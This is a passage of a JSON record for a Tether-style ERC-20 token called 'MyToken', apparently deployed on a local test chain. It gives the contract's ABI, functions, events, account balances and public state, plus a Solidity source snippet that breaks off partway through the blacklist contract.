[],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    